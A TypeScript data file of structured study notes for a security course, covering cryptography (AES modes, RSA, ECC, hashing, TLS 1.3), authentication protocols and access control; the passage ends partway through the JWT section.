export interface Concept {
  id: string;
  name: string;
  description: string;
  keyPoints: string[];
  tradeoffs?: string[];
  realWorld?: string[];
}

export interface Topic {
  id: number;
  title: string;
  part: number;
  partTitle: string;
  summary: string;
  concepts: Concept[];
}

export type Chapter = Topic;

export const parts = [
  { id: 1, title: 'Cryptographic Foundations' },
  { id: 2, title: 'Authentication & Authorization' },
  { id: 3, title: 'Application Security' },
  { id: 4, title: 'Infrastructure Security' },
];

export const topics: Topic[] = [
  // ============================================================
  // PART 1: Cryptographic Foundations (Topics 1-4)
  // ============================================================
  {
    id: 1,
    title: 'Symmetric Encryption',
    part: 1,
    partTitle: 'Cryptographic Foundations',
    summary:
      'Symmetric encryption uses a single shared secret key for both encryption and decryption. It is the workhorse of modern cryptography, providing fast bulk data encryption through algorithms like AES with various block cipher modes.',
    concepts: [
      {
        id: 'aes-block-ciphers',
        name: 'AES & Block Ciphers',
        description:
          'The Advanced Encryption Standard (AES) is the dominant symmetric block cipher, encrypting data in fixed-size blocks (128 bits) using keys of 128, 192, or 256 bits through multiple rounds of substitution and permutation.',
        keyPoints: [
          'AES operates on 128-bit blocks through 10/12/14 rounds (for 128/192/256-bit keys) of SubBytes, ShiftRows, MixColumns, and AddRoundKey transformations that collectively provide confusion and diffusion',
          'Block ciphers process fixed-size blocks — if the plaintext is shorter than the block size, it must be padded (PKCS#7 adds bytes whose value equals the padding length), and improper padding can lead to padding oracle attacks',
          'AES was selected by NIST in 2001 through an open competition, replacing DES (56-bit key, now trivially breakable) and 3DES (slow, 112-bit effective security)',
          'AES-256 provides 256 bits of security against brute force — meaning 2^256 operations to try all keys, which is computationally infeasible even with quantum computers (Grover\'s algorithm reduces it to 2^128, still secure)',
          'Hardware acceleration (AES-NI instruction set in modern CPUs) makes AES encryption nearly free in terms of performance — achieving throughputs of several GB/s on commodity hardware',
        ],
        tradeoffs: [
          'AES-256 provides a larger security margin against quantum attacks (Grover\'s algorithm) but is slightly slower than AES-128 due to additional rounds — in practice the performance difference is negligible with hardware acceleration',
          'Block ciphers alone only encrypt single blocks — the choice of mode of operation (CBC, GCM, CTR) determines how multiple blocks are chained together and has critical security implications',
        ],
        realWorld: [
          'TLS 1.3 uses AES-128-GCM and AES-256-GCM as its primary cipher suites',
          'Full-disk encryption (BitLocker, FileVault, LUKS) uses AES-XTS mode',
          'AWS KMS and Google Cloud KMS use AES-256 for envelope encryption',
        ],
      },
      {
        id: 'block-cipher-modes',
        name: 'Block Cipher Modes (CBC/GCM/CTR)',
        description:
          'Block cipher modes of operation define how a block cipher encrypts data larger than a single block. The choice of mode affects security, performance, parallelizability, and whether authentication is built in.',
        keyPoints: [
          'ECB (Electronic Codebook) encrypts each block independently — identical plaintext blocks produce identical ciphertext blocks, leaking patterns (the famous ECB penguin image), making it unsuitable for virtually all real use',
          'CBC (Cipher Block Chaining) XORs each plaintext block with the previous ciphertext block before encryption — requires a random IV, is sequential (cannot parallelize encryption), and is vulnerable to padding oracle attacks if error messages leak padding validity',
          'CTR (Counter) mode turns a block cipher into a stream cipher — encrypting a counter value to produce a keystream that is XORed with plaintext, enabling full parallelization of both encryption and decryption',
          'GCM (Galois/Counter Mode) combines CTR mode encryption with GHASH authentication — providing authenticated encryption (confidentiality + integrity + authenticity) in a single operation, and is the most widely recommended mode',
          'Nonce/IV reuse is catastrophic in CTR and GCM modes — reusing a nonce with the same key in GCM completely breaks both confidentiality and authentication, potentially revealing the authentication key',
        ],
        tradeoffs: [
          'GCM provides authenticated encryption but requires unique nonces and has a practical limit of ~64 GB per nonce-key pair (the GHASH counter wraps) — for very large data, AES-GCM-SIV or chunked encryption is needed',
          'CBC is well-understood and widely supported but is sequential (slow to encrypt) and vulnerable to padding oracle attacks — GCM is preferred for new systems but CBC remains in legacy protocols',
        ],
        realWorld: [
          'TLS 1.3 exclusively uses AEAD ciphers (AES-GCM, ChaCha20-Poly1305)',
          'AWS S3 server-side encryption uses AES-256-GCM for object encryption',
          'IPsec VPN tunnels commonly use AES-CBC or AES-GCM for packet encryption',
        ],
      },
      {
        id: 'key-management-rotation',
        name: 'Key Management & Rotation',
        description:
          'Key management encompasses the generation, storage, distribution, rotation, and destruction of cryptographic keys. It is widely considered the hardest part of cryptography — a strong algorithm with poor key management provides no security.',
        keyPoints: [
          'Keys must be generated from cryptographically secure random number generators (CSPRNG) — using Math.random() or predictable seeds makes keys guessable regardless of algorithm strength',
          'Key hierarchy separates concerns: a master key (stored in HSM) encrypts data encryption keys (DEKs), which encrypt actual data — this envelope encryption pattern means rotating the master key only requires re-encrypting DEKs, not all data',
          'Key rotation limits the blast radius of a compromise — if a key is leaked, only data encrypted with that key is exposed, and regular rotation ensures older data is protected by newer keys',
          'Hardware Security Modules (HSMs) provide tamper-resistant key storage and perform cryptographic operations internally — the key never leaves the HSM, protecting against memory dumps and side-channel attacks',
          'Key escrow and recovery procedures must be planned — if encryption keys are lost (employee departure, hardware failure), the encrypted data is permanently inaccessible without a recovery mechanism',
        ],
        tradeoffs: [
          'Frequent key rotation reduces exposure from compromised keys but increases operational complexity — re-encrypting data with new keys requires careful orchestration to avoid service disruption',
          'HSMs provide the strongest key protection but are expensive ($5K-$50K+) and add latency for every cryptographic operation — cloud-managed KMS services offer a middle ground with lower cost but require trusting the cloud provider',
        ],
        realWorld: [
          'AWS KMS with automatic annual key rotation and envelope encryption',
          'HashiCorp Vault for dynamic secret generation and lease-based key rotation',
          'PCI DSS requires cryptographic key rotation at least annually for payment card data',
        ],
      },
    ],
  },
  {
    id: 2,
    title: 'Asymmetric Encryption & PKI',
    part: 1,
    partTitle: 'Cryptographic Foundations',
    summary:
      'Asymmetric (public-key) cryptography uses mathematically linked key pairs — a public key for encryption and a private key for decryption. Combined with Public Key Infrastructure (PKI), it enables secure communication between parties who have never shared a secret.',
    concepts: [
      {
        id: 'rsa-encryption',
        name: 'RSA Encryption',
        description:
          'RSA is the foundational public-key cryptosystem based on the difficulty of factoring the product of two large prime numbers. It enables encryption, digital signatures, and key exchange without a pre-shared secret.',
        keyPoints: [
          'RSA key generation selects two large primes (p, q), computes n = p*q (the modulus), and derives the public exponent (e, typically 65537) and private exponent (d) using the extended Euclidean algorithm — security relies on the infeasibility of factoring n back into p and q',
          'RSA encryption computes ciphertext c = m^e mod n (fast with the public key), while decryption computes m = c^d mod n (requires the private key) — the asymmetry means anyone can encrypt but only the key holder can decrypt',
          'RSA key sizes of 2048 bits are the current minimum standard, with 4096 bits recommended for long-term security — RSA-1024 is considered broken as factoring algorithms and hardware improve',
          'RSA is slow compared to symmetric encryption (1000x slower than AES) — in practice, RSA encrypts a symmetric session key which then encrypts the bulk data (hybrid encryption)',
          'PKCS#1 v1.5 padding for RSA has known vulnerabilities (Bleichenbacher attack) — OAEP (Optimal Asymmetric Encryption Padding) should be used for encryption, and PSS for signatures',
        ],
        tradeoffs: [
          'RSA provides the most well-studied and widely deployed public-key cryptosystem, but key sizes must grow quadratically to maintain security — 2048-bit RSA provides roughly 112 bits of security, requiring 15360-bit keys for 256-bit security',
          'RSA is vulnerable to quantum computers running Shor\'s algorithm which can factor large numbers in polynomial time — post-quantum migration to lattice-based cryptography (CRYSTALS-Kyber) is underway',
        ],
        realWorld: [
          'SSH key authentication using RSA-2048 or RSA-4096 key pairs',
          'PGP/GPG email encryption with RSA public/private key pairs',
          'Legacy TLS 1.2 handshakes using RSA key exchange (deprecated in TLS 1.3)',
        ],
      },
      {
        id: 'elliptic-curve-cryptography',
        name: 'Elliptic Curve Cryptography',
        description:
          'Elliptic Curve Cryptography (ECC) achieves the same security as RSA with much smaller key sizes by leveraging the difficulty of the Elliptic Curve Discrete Logarithm Problem (ECDLP) on curves over finite fields.',
        keyPoints: [
          'ECC operates on points on an elliptic curve (y^2 = x^3 + ax + b over a finite field) — the private key is a random scalar k, and the public key is the point k*G where G is a generator point, and computing k from k*G is computationally infeasible',
          'A 256-bit ECC key provides equivalent security to a 3072-bit RSA key — this dramatic size reduction translates to faster operations, smaller certificates, and lower bandwidth for TLS handshakes',
          'Common standardized curves include NIST P-256 (secp256r1), P-384, and Curve25519 — Curve25519 is preferred for key exchange (X25519) due to its resistance to implementation errors and constant-time operations',
          'ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) is the standard key exchange in TLS 1.3 — using ephemeral keys for every session provides perfect forward secrecy',
          'Ed25519 (Edwards curve) is the modern standard for digital signatures — faster than ECDSA, deterministic (no random nonce needed, eliminating a class of implementation bugs), and resistant to side-channel attacks',
        ],
        tradeoffs: [
          'ECC provides stronger security per bit than RSA (256-bit ECC ~ 3072-bit RSA) and is faster for key generation and signing, but some curves (NIST P-256) have been questioned for potential backdoors due to unexplained parameter choices',
          'ECC is still vulnerable to quantum computers (Shor\'s algorithm works on ECDLP too) — post-quantum algorithms like CRYSTALS-Dilithium are being standardized as replacements',
        ],
        realWorld: [
          'TLS 1.3 uses X25519 (Curve25519-based ECDHE) as the default key exchange',
          'Bitcoin and Ethereum use secp256k1 curve for transaction signing',
          'Apple\'s Secure Enclave uses P-256 for hardware-backed key storage',
        ],
      },
      {
        id: 'x509-certificates-cas',
        name: 'X.509 Certificates & CAs',
        description:
          'X.509 certificates bind a public key to an identity (domain name, organization) through a digital signature from a trusted Certificate Authority (CA), forming the trust backbone of HTTPS and PKI.',
        keyPoints: [
          'An X.509 certificate contains the subject (identity), public key, issuer (CA), validity period, serial number, and the CA\'s digital signature — browsers verify the signature chain up to a trusted root CA embedded in the OS/browser trust store',
          'The CA hierarchy consists of root CAs (self-signed, stored in trust stores), intermediate CAs (signed by roots, used for day-to-day issuance), and end-entity certificates — intermediate CAs limit exposure if a signing key is compromised',
          'Certificate validation checks the signature chain, expiration date, revocation status (via CRL or OCSP), and that the Subject Alternative Name (SAN) matches the requested domain — failure at any step triggers a browser warning',
          'Let\'s Encrypt revolutionized certificate issuance with free, automated, 90-day certificates using the ACME protocol — driving HTTPS adoption from ~40% to >95% of web traffic',
          'Certificate Transparency (CT) logs provide a public, append-only record of all issued certificates — enabling domain owners to detect unauthorized certificates issued for their domains (e.g., by a compromised CA)',
        ],
        tradeoffs: [
          'Short-lived certificates (90 days, Let\'s Encrypt) reduce the window of exposure from compromised keys but require automated renewal — manual renewal at scale is operationally unsustainable',
          'The CA trust model is only as strong as its weakest CA — any trusted CA can issue a certificate for any domain, and CA compromises (DigiNotar 2011) can undermine the entire system until the CA is removed from trust stores',
        ],
        realWorld: [
          'Let\'s Encrypt issues ~3 million certificates daily via automated ACME protocol',
          'Google Certificate Transparency monitors all publicly trusted certificates',
          'mTLS (mutual TLS) in service meshes like Istio uses short-lived X.509 certificates for pod-to-pod authentication',
        ],
      },
    ],
  },
  {
    id: 3,
    title: 'Hashing & Digital Signatures',
    part: 1,
    partTitle: 'Cryptographic Foundations',
    summary:
      'Cryptographic hash functions produce fixed-size fingerprints of arbitrary data, enabling integrity verification, password storage, and digital signatures. Combined with asymmetric keys, they form the basis of non-repudiation and authentication.',
    concepts: [
      {
        id: 'sha256-hash-functions',
        name: 'SHA-256 & Hash Functions',
        description:
          'Cryptographic hash functions take arbitrary-length input and produce a fixed-length output (digest) with properties that make them foundational to security: collision resistance, preimage resistance, and the avalanche effect.',
        keyPoints: [
          'SHA-256 produces a 256-bit (32-byte) digest and is part of the SHA-2 family designed by the NSA — it provides 128 bits of collision resistance (birthday attack requires 2^128 operations) and 256 bits of preimage resistance',
          'Collision resistance means it is computationally infeasible to find two different inputs that produce the same hash — this property is critical for digital signatures (signing a hash guarantees uniqueness of the signed document)',
          'The avalanche effect ensures that changing a single bit of input changes approximately 50% of output bits — making it impossible to deduce input changes from output changes or reverse-engineer the input from the hash',
          'MD5 (128-bit) and SHA-1 (160-bit) are cryptographically broken — practical collision attacks exist (SHA-1 collision demonstrated by Google/CWI in 2017), and they must not be used for security purposes',
          'Hash functions are deterministic and fast — the same input always produces the same output, enabling efficient integrity verification of files, messages, and data structures (Merkle trees, blockchain)',
        ],
        tradeoffs: [
          'SHA-256 is fast by design, which is ideal for data integrity but makes it unsuitable for password hashing — attackers can compute billions of SHA-256 hashes per second on GPUs, making brute-force password cracking trivial',
          'SHA-3 (Keccak) provides an alternative to SHA-2 with a completely different internal structure (sponge construction vs Merkle-Damgard) — it offers similar security but serves as a hedge if SHA-2 is ever broken',
        ],
        realWorld: [
          'Git uses SHA-1 (migrating to SHA-256) for content-addressable storage of commits and objects',
          'Bitcoin proof-of-work requires finding inputs whose SHA-256 hash starts with a specific number of zero bits',
          'Software package managers (npm, pip, apt) verify download integrity using SHA-256 checksums',
        ],
      },
      {
        id: 'password-hashing',
        name: 'Password Hashing (bcrypt/Argon2)',
        description:
          'Password hashing algorithms are deliberately slow and memory-hard, designed to make brute-force attacks computationally expensive. Unlike general-purpose hashes, they include salts and tunable work factors.',
        keyPoints: [
          'Password hashes must be slow (key stretching) — bcrypt uses a configurable cost factor (2^cost iterations), Argon2 is tunable for time, memory, and parallelism, making brute-force attacks proportionally more expensive',
          'Salting prepends a unique random value to each password before hashing — even identical passwords produce different hashes, defeating precomputed rainbow tables and ensuring that cracking one hash does not reveal others with the same password',
          'Argon2 (winner of the 2015 Password Hashing Competition) comes in three variants: Argon2d (data-dependent, GPU-resistant), Argon2i (data-independent, side-channel resistant), and Argon2id (hybrid, recommended for password hashing)',
          'bcrypt is limited to 72 bytes of input and uses the Blowfish cipher internally — it has a 22-character base64-encoded salt and produces a 60-character hash string that includes the algorithm identifier, cost factor, salt, and hash',
          'The work factor should be tuned so that hashing takes ~250ms-1s on your hardware — this is imperceptible to legitimate users logging in once but makes offline brute-force attacks on stolen hashes extremely costly',
        ],
        tradeoffs: [
          'Argon2id is the modern recommendation (memory-hard, resistant to GPU/ASIC attacks) but requires more server resources per login — bcrypt is simpler to deploy and well-supported across languages, making it an acceptable choice if Argon2 is unavailable',
          'Higher work factors increase security but also increase server CPU/memory usage during authentication — under a credential stuffing attack, the authentication endpoint can become a denial-of-service vector if the work factor is too high',
        ],
        realWorld: [
          'Django uses PBKDF2-SHA256 by default with a configurable iteration count (now 870,000+ iterations)',
          'Dropbox uses bcrypt with a cost factor of 10, then encrypts the bcrypt hash with AES-256 using a global pepper stored in an HSM',
          'OWASP recommends Argon2id with minimum 19 MiB memory, 2 iterations, and 1 parallelism degree',
        ],
      },
      {
        id: 'hmac-digital-signatures',
        name: 'HMAC & Digital Signatures',
        description:
          'HMACs provide message authentication using a shared secret key combined with a hash function, while digital signatures use asymmetric keys to provide non-repudiation — proving both integrity and the identity of the signer.',
        keyPoints: [
          'HMAC (Hash-based Message Authentication Code) computes H(K xor opad || H(K xor ipad || message)) — using the key in both an inner and outer hash prevents length extension attacks that affect naive key-prefixed hashing',
          'Digital signatures use the signer\'s private key to sign a hash of the message — anyone with the public key can verify the signature, providing non-repudiation (the signer cannot deny having signed, unlike HMAC where both parties share the key)',
          'RSA-PSS (Probabilistic Signature Scheme) and Ed25519 are the recommended signature algorithms — RSA-PKCS1v15 signatures have known vulnerabilities (Bleichenbacher\'s e=3 attack) and should be avoided for new applications',
          'Ed25519 signatures are deterministic (the nonce is derived from the message and private key, not random) — this eliminates the catastrophic vulnerability in ECDSA where nonce reuse leaks the private key (PlayStation 3 hack)',
          'JWTs commonly use HMAC-SHA256 (HS256) for stateless token signing — the server signs the token with a secret key and verifies it on each request without database lookup, but key compromise exposes all tokens',
        ],
        tradeoffs: [
          'HMAC is simpler and faster than digital signatures but requires a shared secret — both parties can produce valid MACs, so HMAC cannot provide non-repudiation (you cannot prove which party created the MAC)',
          'Digital signatures provide non-repudiation but are computationally expensive (RSA signing is ~100x slower than HMAC) — in high-throughput systems, HMACs are preferred when non-repudiation is not required',
        ],
        realWorld: [
          'AWS request signing uses HMAC-SHA256 with a derived signing key for API authentication',
          'Code signing (Windows Authenticode, macOS Gatekeeper) uses RSA or ECC digital signatures to verify software authenticity',
          'Webhook verification (Stripe, GitHub) uses HMAC-SHA256 to authenticate incoming webhook payloads',
        ],
      },
    ],
  },
  {
    id: 4,
    title: 'Key Exchange & TLS',
    part: 1,
    partTitle: 'Cryptographic Foundations',
    summary:
      'Key exchange protocols enable two parties to establish a shared secret over an insecure channel without prior communication. TLS combines key exchange, symmetric encryption, and authentication into the protocol that secures virtually all internet communication.',
    concepts: [
      {
        id: 'diffie-hellman-key-exchange',
        name: 'Diffie-Hellman Key Exchange',
        description:
          'The Diffie-Hellman (DH) protocol allows two parties to jointly establish a shared secret over a public channel by exchanging public values derived from their private secrets, without ever transmitting the secret itself.',
        keyPoints: [
          'Both parties agree on a large prime p and generator g — Alice chooses private a, sends g^a mod p; Bob chooses private b, sends g^b mod p — both compute the shared secret as g^(ab) mod p, which an eavesdropper cannot derive from the public values',
          'The security of DH relies on the Discrete Logarithm Problem — given g, p, and g^a mod p, computing a is computationally infeasible for sufficiently large primes (2048+ bits for classical security)',
          'Ephemeral DH (DHE) generates new private values for every session — if a long-term key is later compromised, past session keys cannot be recovered, providing perfect forward secrecy (PFS)',
          'ECDHE (Elliptic Curve DH Ephemeral) replaces modular exponentiation with elliptic curve point multiplication — providing equivalent security with much smaller key sizes (256-bit ECC ~ 3072-bit DH) and faster computation',
          'DH is vulnerable to man-in-the-middle attacks without authentication — an attacker can perform separate DH exchanges with each party, relaying modified messages, which is why DH is always combined with authentication (certificates, signatures)',
        ],
        tradeoffs: [
          'Ephemeral DH provides perfect forward secrecy but requires fresh key generation for every session — this adds computational cost compared to static DH, though with ECDHE the overhead is minimal',
          'Larger DH groups (3072-bit, 4096-bit) provide more security against future attacks but increase handshake latency — ECDHE achieves equivalent security with much less computation',
        ],
        realWorld: [
          'TLS 1.3 mandates ECDHE (or DHE) for key exchange — static RSA key exchange is removed entirely',
          'Signal Protocol uses X25519 (Curve25519-based ECDH) for the Double Ratchet key exchange',
          'WireGuard VPN uses Noise protocol framework with X25519 for key exchange',
        ],
      },
      {
        id: 'tls-1-3-handshake',
        name: 'TLS 1.3 Handshake',
        description:
          'TLS 1.3 (RFC 8446) dramatically simplified the TLS handshake to a single round trip (1-RTT), removed insecure legacy features, and mandates perfect forward secrecy — making HTTPS faster and more secure simultaneously.',
        keyPoints: [
          'The TLS 1.3 handshake completes in 1-RTT: the client sends ClientHello with supported cipher suites and key shares (ECDHE public values), the server responds with ServerHello, its key share, encrypted certificate, and Finished — reducing latency by 50% compared to TLS 1.2\'s 2-RTT handshake',
          '0-RTT resumption allows clients to send encrypted application data in the first message when reconnecting to a known server — using a pre-shared key (PSK) from a previous session, though 0-RTT data is vulnerable to replay attacks',
          'TLS 1.3 removed all insecure legacy features: RSA key exchange (no PFS), CBC mode ciphers (padding oracle attacks), static DH, compression (CRIME attack), and renegotiation — only AEAD ciphers (AES-GCM, ChaCha20-Poly1305) with ECDHE/DHE are allowed',
          'The handshake is encrypted after the ServerHello — the server certificate and all subsequent messages are encrypted, hiding the server identity from passive observers (unlike TLS 1.2 where the certificate was sent in plaintext)',
          'Cipher suites in TLS 1.3 are simplified to just five: TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_128_CCM_SHA256, and TLS_AES_128_CCM_8_SHA256',
        ],
        tradeoffs: [
          'TLS 1.3\'s 0-RTT mode reduces latency for repeat connections but introduces replay risk — an attacker can capture and re-send the 0-RTT data, so it should only be used for idempotent requests (GET, not POST with payment)',
          'TLS 1.3 breaks middlebox inspection (corporate firewalls, DLP systems) because the certificate is encrypted — this has led to Enterprise-specific workarounds and the controversial Encrypted Client Hello (ECH) debate',
        ],
        realWorld: [
          'Cloudflare, Google, and Facebook enabled TLS 1.3 for billions of connections, reporting 40% reduction in handshake latency',
          'QUIC (HTTP/3) integrates TLS 1.3 directly into its transport layer, achieving 0-RTT connection establishment',
          'Chrome and Firefox have deprecated TLS 1.0/1.1 entirely, with TLS 1.2 and 1.3 being the only supported versions',
        ],
      },
      {
        id: 'perfect-forward-secrecy',
        name: 'Perfect Forward Secrecy',
        description:
          'Perfect Forward Secrecy (PFS) ensures that compromise of a long-term private key does not compromise past session keys — each session uses ephemeral keys that are discarded after use, protecting historical traffic even if the server key is later exposed.',
        keyPoints: [
          'Without PFS (static RSA key exchange), an attacker who records encrypted traffic and later obtains the server\'s private key can decrypt all past recorded sessions — PFS makes recorded traffic permanently undecryptable even with key compromise',
          'PFS is achieved by using ephemeral Diffie-Hellman (DHE or ECDHE) — each session generates fresh DH key pairs, derives a unique session key, and then discards the ephemeral private keys, making past sessions unrecoverable',
          'TLS 1.3 mandates PFS by design — it removed RSA key exchange entirely, requiring all connections to use ephemeral key exchange (ECDHE or DHE), eliminating the possibility of non-PFS configurations',
          'Intelligence agencies and adversaries practice "collect now, decrypt later" — recording encrypted traffic today hoping to obtain the server key (or build a quantum computer) in the future, making PFS critical for sensitive communications',
          'Session keys derived from ephemeral DH are independent — compromising one session key does not help decrypt any other session, even between the same client and server',
        ],
        tradeoffs: [
          'PFS adds a small amount of computational overhead per connection (ephemeral key generation) but with ECDHE the cost is negligible — the security benefit of protecting past sessions far outweighs the performance cost',
          'PFS complicates lawful interception and network debugging — organizations that need to inspect TLS traffic must use alternative approaches (TLS termination proxies, endpoint agents) rather than relying on the server\'s private key',
        ],
        realWorld: [
          'TLS 1.3 enforces PFS universally — all major web servers and CDNs now use ECDHE for every connection',
          'Signal, WhatsApp, and iMessage use the Double Ratchet algorithm for per-message forward secrecy in messaging',
          'SSH with ECDH key exchange provides PFS for remote administration sessions',
        ],
      },
    ],
  },

  // ============================================================
  // PART 2: Authentication & Authorization (Topics 5-7)
  // ============================================================
  {
    id: 5,
    title: 'Authentication Protocols',
    part: 2,
    partTitle: 'Authentication & Authorization',
    summary:
      'Authentication verifies the identity of users and systems through various mechanisms — from passwords and multi-factor authentication to delegated authorization protocols like OAuth 2.0 that enable secure third-party access without sharing credentials.',
    concepts: [
      {
        id: 'passwords-mfa',
        name: 'Passwords & Multi-Factor Auth',
        description:
          'Password-based authentication remains the most common identity verification method, but its weaknesses (reuse, phishing, brute force) necessitate multi-factor authentication combining something you know, have, and are.',
        keyPoints: [
          'Password entropy determines brute-force resistance — a random 12-character password with mixed case, digits, and symbols has ~72 bits of entropy, while common passwords like "password123" have near-zero effective entropy due to dictionary attacks',
          'Multi-factor authentication (MFA) requires two or more independent factors: knowledge (password), possession (TOTP app, hardware key), and inherence (biometrics) — compromising one factor alone is insufficient to authenticate',
          'TOTP (Time-based One-Time Password, RFC 6238) generates 6-digit codes from a shared secret and the current time — the server and client independently compute the same code, valid for 30 seconds, without network communication',
          'FIDO2/WebAuthn hardware keys (YubiKey, Titan) provide phishing-resistant MFA — the browser sends the relying party\'s origin to the key, which will not authenticate if the origin doesn\'t match, defeating man-in-the-middle phishing sites',
          'SMS-based 2FA is the weakest second factor — SIM swapping attacks (social engineering the carrier to transfer the phone number) and SS7 protocol vulnerabilities allow attackers to intercept SMS codes',
        ],
        tradeoffs: [
          'Hardware security keys (FIDO2) provide the strongest phishing resistance but require users to carry a physical device and cost $25-$50 each — TOTP apps (Google Authenticator, Authy) are free and convenient but vulnerable to phishing (user can be tricked into entering the code on a fake site)',
          'Strict password policies (length, complexity, rotation) increase security but degrade user experience — NIST SP 800-63B now recommends long passphrases over complex passwords and advises against mandatory rotation unless compromise is suspected',
        ],
        realWorld: [
          'Google reported that hardware security keys eliminated phishing attacks against 85,000+ employees — zero successful phishing after deploying YubiKeys',
          'Microsoft Authenticator and Google Authenticator provide TOTP-based MFA for millions of accounts',
          'Passkeys (FIDO2 discoverable credentials) are being adopted by Apple, Google, and Microsoft as password replacements',
        ],
      },
      {
        id: 'oauth2-flows',
        name: 'OAuth 2.0 Flows',
        description:
          'OAuth 2.0 is a delegated authorization framework that allows applications to access resources on behalf of a user without obtaining their credentials — using access tokens granted through specific flows designed for different client types.',
        keyPoints: [
          'The Authorization Code flow (with PKCE) is the recommended flow for all clients — the client redirects the user to the authorization server, receives an authorization code at the redirect URI, and exchanges it for tokens at the token endpoint using a code verifier (PKCE prevents interception)',
          'Access tokens are short-lived (5-60 minutes) bearer tokens that authorize API requests — refresh tokens are long-lived and stored securely to obtain new access tokens without re-authentication, but must be rotated on each use',
          'The Implicit flow (returning tokens directly in the URL fragment) is deprecated — tokens in URLs are logged in browser history and server logs, and the flow cannot use refresh tokens or PKCE',
          'Client Credentials flow is for machine-to-machine (M2M) communication — the client authenticates with its own credentials (client ID + secret) to get an access token, with no user involvement',
          'Scopes limit what an access token can do (e.g., "read:email", "write:repos") — the principle of least privilege dictates requesting only the minimum scopes needed, and users can see and approve requested scopes during authorization',
        ],
        tradeoffs: [
          'Authorization Code + PKCE is the most secure flow but requires a redirect-based interaction and server-side token exchange — for single-page apps (SPAs), this means either a backend-for-frontend (BFF) pattern or storing tokens in the browser (XSS risk)',
          'Refresh token rotation (issuing a new refresh token with each use and invalidating the old one) detects theft but complicates concurrent requests — if two requests use the same refresh token simultaneously, one will fail and both tokens are invalidated',
        ],
        realWorld: [
          'GitHub OAuth allows third-party apps to access repositories with granular scope permissions',
          'Google Sign-In uses Authorization Code flow with PKCE for web and mobile applications',
          'Spotify API uses OAuth 2.0 with refresh tokens for long-lived music player integrations',
        ],
      },
      {
        id: 'oidc-saml',
        name: 'OpenID Connect & SAML',
        description:
          'OpenID Connect (OIDC) adds an identity layer on top of OAuth 2.0, providing standardized user authentication and profile information. SAML (Security Assertion Markup Language) is the older XML-based federation standard still dominant in enterprise SSO.',
        keyPoints: [
          'OIDC adds an ID Token (JWT) to the OAuth 2.0 authorization code response — the ID token contains claims about the user\'s identity (sub, email, name) signed by the identity provider, allowing the client to verify authentication without an additional API call',
          'The OIDC Discovery document (/.well-known/openid-configuration) provides all metadata needed to configure a client — authorization endpoint, token endpoint, JWKS URI (for verifying ID token signatures), and supported scopes and claims',
          'SAML uses XML-based assertions exchanged between an Identity Provider (IdP) and a Service Provider (SP) — the IdP authenticates the user and sends a signed SAML Response containing identity attributes to the SP via the user\'s browser (POST binding)',
          'SAML\'s XML Signature Wrapping attacks exploit the complexity of XML canonicalization — attackers can modify the assertion while keeping the signature valid, which is why SAML libraries must be carefully validated and updated',
          'OIDC is preferred for modern applications (REST/JSON-native, mobile-friendly, simpler) while SAML remains entrenched in enterprise environments — many organizations support both, using SAML for legacy apps and OIDC for new development',
        ],
        tradeoffs: [
          'OIDC is simpler and developer-friendly (JSON/JWT-based, REST APIs) but has a shorter track record in enterprise environments — SAML is battle-tested in enterprise SSO but is complex (XML parsing, canonicalization, signature validation) and unsuitable for mobile apps',
          'ID tokens in OIDC should be validated on every use (signature, issuer, audience, expiration) but many implementations skip validation, treating the JWT as opaque — this undermines the security guarantees OIDC provides',
        ],
        realWorld: [
          'Okta, Auth0, and Azure AD support both OIDC and SAML for enterprise identity federation',
          'Sign in with Apple uses OIDC with additional privacy features (private email relay, no tracking)',
          'Salesforce, Workday, and ServiceNow use SAML for enterprise SSO integration',
        ],
      },
    ],
  },
  {
    id: 6,
    title: 'Authorization & Access Control',
    part: 2,
    partTitle: 'Authentication & Authorization',
    summary:
      'Authorization determines what authenticated users are allowed to do. Access control models like RBAC and ABAC define policies, while tokens (JWTs, sessions) carry authorization state between requests.',
    concepts: [
      {
        id: 'rbac-abac',
        name: 'RBAC & ABAC',
        description:
          'Role-Based Access Control (RBAC) assigns permissions to roles and users to roles, simplifying permission management. Attribute-Based Access Control (ABAC) evaluates policies against attributes of the user, resource, action, and environment for fine-grained decisions.',
        keyPoints: [
          'RBAC groups permissions into roles (admin, editor, viewer) — users are assigned roles, and access decisions are based on role membership, reducing the complexity of managing permissions for large numbers of users',
          'Hierarchical RBAC allows roles to inherit permissions from parent roles — an "admin" role inherits all "editor" permissions, which inherits all "viewer" permissions, reducing role explosion but increasing complexity of permission tracing',
          'ABAC evaluates policies using attributes: subject attributes (user.department, user.clearance), resource attributes (document.classification, document.owner), action (read, write, delete), and environment (time, IP, location) — enabling policies like "doctors can read patient records only during their shift and only for patients in their department"',
          'The principle of least privilege dictates granting only the minimum permissions necessary — users should default to no access, with explicit grants for each required permission, and elevated privileges should be time-limited',
          'Permission boundaries (AWS IAM permission boundaries) set the maximum permissions a role can have — even if a policy grants broader access, the boundary limits the effective permissions, providing a safety net against over-permissive policies',
        ],
        tradeoffs: [
          'RBAC is simple to understand, audit, and implement, but can lead to role explosion in complex organizations — dozens of roles with overlapping permissions become hard to manage, leading to overly broad roles (violating least privilege) or too many narrow roles',
          'ABAC provides fine-grained, context-aware access control but requires a policy engine (OPA, Cedar) and attribute infrastructure — policies are harder to audit and debug than simple role assignments, and policy evaluation adds latency to every request',
        ],
        realWorld: [
          'AWS IAM uses a hybrid RBAC/ABAC model with policies, roles, permission boundaries, and condition keys',
          'Google Workspace uses RBAC with organizational units and groups for permission management',
          'Open Policy Agent (OPA) implements ABAC with Rego policy language for Kubernetes and microservices authorization',
        ],
      },
      {
        id: 'jwt-session-tokens',
        name: 'JWT & Session Tokens',
        description:
          'JSON Web Tokens (JWTs) are self-contained, signed tokens carrying claims (user identity, permissions, expiration) that enable stateless authorization. Session tokens are opaque server-side references that require server-side storage but offer simpler revocation.',
        keyPoints: [
          'A JWT consists of three Base64URL-encoded parts: header (algorithm, type), payload (claims like sub, iat, exp, custom claims), and signature (HMAC or RSA/ECDSA over header+payload) — the server verifies the signature without database lookup',
          'JWTs are stateless — the server does not need to store session state, making them ideal for distributed systems where any server can validate the token independently using the signing key or public key',
          'Session tokens are opaque strings (random UUIDs) that map to server-side session data — revocation is immediate (delete the session record), but requires a session store (Redis, database) that becomes a scaling bottleneck and single point of failure',
